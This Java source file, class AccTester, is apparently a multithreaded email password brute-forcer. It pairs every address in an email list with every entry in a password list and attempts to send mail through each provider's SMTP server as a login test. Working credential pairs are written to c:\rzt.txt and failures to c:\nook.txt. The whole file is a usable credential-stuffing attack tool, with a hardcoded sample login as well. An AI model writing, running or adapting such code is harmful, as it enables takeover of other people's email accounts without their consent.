package com.attilax.mail;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.mail.AuthenticationFailedException;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;

import com.attilax.io.filex;

public class AccTester {
	private static ExecutorService es ;
	int threadCount;
	public AccTester(int threadCount) {
		this.threadCount=threadCount;
		es= Executors.newFixedThreadPool(threadCount);
	}

	public static void main(String[] args) throws MessagingException {
		// javax.mail.AuthenticationFailedException: Unable to log on
		String host = "pop.163.com"; //
		String username = "xinyuan"; //
		String password = "123456"; //
		AccTester ax = new AccTester(5);
		// ax.connect(host, username, password);
		String emFile = "c:\\em.txt";
		String pwd = "c:\\pwd.txt";
		String rzt = "c:\\rzt.txt";
		ax.start(emFile, pwd, rzt);
	
		System.out.println("--");
	}

	filex rztF;
	filex rztFNoOK;

	@SuppressWarnings("unchecked")
	public void start(String emFile, String pwdFile, String rztFile) {
		try {
			rztF = new filex(rztFile);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			throw new RuntimeException(e1);
		}
		try {
			rztFNoOK=new filex("c:\\nook.txt");
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		List<String> li = filex.read2list_filtEmptyNstartSpace(emFile);
		for (String em : li) {
			try {
				String[] split = em.split("@");
				final	String username = split[0];
			final	String host2 = split[1];
			final	String	host = "smtp." + host2;
				es.submit(new Callable() {

					@Override
					public Object call() throws Exception {
						start_singleAcc(host, username, pwdFile, rztFile, em);
						return null;
					}
				//	
				});
			

			} catch (Exception e) {
				System.out.println(e);
			}
		}
		try {
			es.shutdown();
			es.awaitTermination(1, TimeUnit.DAYS);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			rztF.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		try {
			rztFNoOK.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		

	}

	private void start_singleAcc(String host, String username, String pwdFile,
			String rztFile, String em) {
		List<String> li = filex.read2list_filtEmptyNstartSpace(pwdFile);
		for (String pwd : li) {
			try {
				System.out.println(em + "," + pwd);
				SimpleMailSender c=new SimpleMailSender(em, pwd);
				try {
					c.send("attilax2@qq.com", "title", "txtxxx");
					rztF.append_HP_Safe_Syn(em + "," + pwd+"\r\n");
					
				} catch (MessagingException e) {
					// javax.mail.SendFailedException   extent  message ext
					e.printStackTrace();
					
					rztFNoOK.append_HP_Safe_Syn(em + "," + pwd+"\r\n");
				}
//				AccTester ax = new AccTester();
//				ax.connect(host, username, pwd);
			
			} catch (Exception e) {

			}

		}

	}

	private void connect(String host, String username, String password) {
		Properties props = new Properties();
		Session session = Session.getDefaultInstance(props, null);

		Store store;
		try {
			store = session.getStore("pop3");
		} catch (NoSuchProviderException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			throw new RuntimeException(e);
		}
		try {
			store.connect(host, username, password);
		} catch (MessagingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			throw new RuntimeException(e);
		}

	}

}
